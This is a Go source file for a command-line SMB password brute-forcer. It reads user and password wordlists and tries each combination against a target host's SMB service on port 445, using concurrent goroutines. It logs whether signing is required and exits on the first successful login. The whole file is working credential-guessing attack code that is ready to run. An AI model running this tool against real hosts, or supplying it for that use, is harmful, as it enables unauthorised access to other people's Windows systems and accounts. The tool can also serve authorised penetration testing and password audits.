package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"os"

	"github.com/stacktitan/smb/smb"
)

func end(msg string) {
	fmt.Println(msg)
	os.Exit(1)
}

func check(err error, msg string) {
	if err != nil {
		end(msg)
	}
}

func trySMB(host string, port int, domain string, login string, passw string, debug bool) {
	options := smb.Options{
		Host:        host,
		Port:        port,
		User:        login,
		Domain:      domain,
		Workstation: "",
		Password:    passw,
	}

	session, err := smb.NewSession(options, debug)
	if err != nil {
		log.Printf("%s:%s [!] %v\n", login, passw, err)
		return
	}
	defer session.Close()

	if session.IsSigningRequired {
		log.Printf("%s:%s [-] Signing is required", login, passw)
	} else {
		log.Printf("%s:%s [+] Signing is NOT required", login, passw)
	}

	if session.IsAuthenticated {
		log.Printf("%s:%s [+] Login successful", login, passw)
		os.Exit(1)
	} else {
		log.Printf("%s:%s [-] Login failed", login, passw)
	}

	if err != nil {
		log.Printf("%s:%s [!] %v", login, passw, err)
	}
}

func loadWordlist(wordlist string, c chan string, cont string) {
	var w string
	doCont := false
	file, err := os.Open(wordlist)
	check(err, "Can't load the wordlist")
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		if cont != "" {
			w = scanner.Text()

			if doCont {
				c <- w
			} else {
				if w == cont {
					doCont = true
				}
			}

		} else {
			c <- scanner.Text()
		}
	}
	//c <- "[EOF1337]"
	close(c)
	fmt.Println("Wordlist completed.")
}

func wait() {
	var i int
	fmt.Printf("Scanning, press enter to interrupt.\n")
	fmt.Scanf("%d", &i)
	fmt.Printf("interrupted.")
}

func main() {
	var host *string = flag.String("h", "", "target host")
	var domain *string = flag.String("d", "localhost", "domain name")
	var login *string = flag.String("l", "administrator", "user name")
	var loginList *string = flag.String("L", "", "login wordlist file")
	var passw *string = flag.String("p", "", "password")
	var passwList *string = flag.String("P", "", "password wordlist file")
	var port *int = flag.Int("port", 445, "the smb port")
	var debug *bool = flag.Bool("v", false, "verbose")
	var goroutines *int = flag.Int("go", 1, "num of concurrent goroutines")
	var cont *string = flag.String("c", "", "continue from specific word")
	flag.Parse()

	if *host == "" || (*passw == "" && *passwList == "") {
		end("try --help")
	}

	loginChan := make(chan string, 6)
	passwChan := make(chan string, 6)

	if *loginList != "" {
		go loadWordlist(*loginList, loginChan, "")
	} else {
		loginChan <- *login
	}
	if *passwList != "" {
		go loadWordlist(*passwList, passwChan, *cont)
	} else {
		passwChan <- *passw
	}

	for i := 0; i < *goroutines; i++ {
		go func(host string, port int, domain string, debug bool, login_chan <-chan string, passw_chan <-chan string) {

			for l := range login_chan {
				for p := range passw_chan {
					trySMB(host, port, domain, l, p, debug)
				}
			}

			end("bruteforce finished")

		}(*host, *port, *domain, *debug, loginChan, passwChan)
	}

	wait()
}
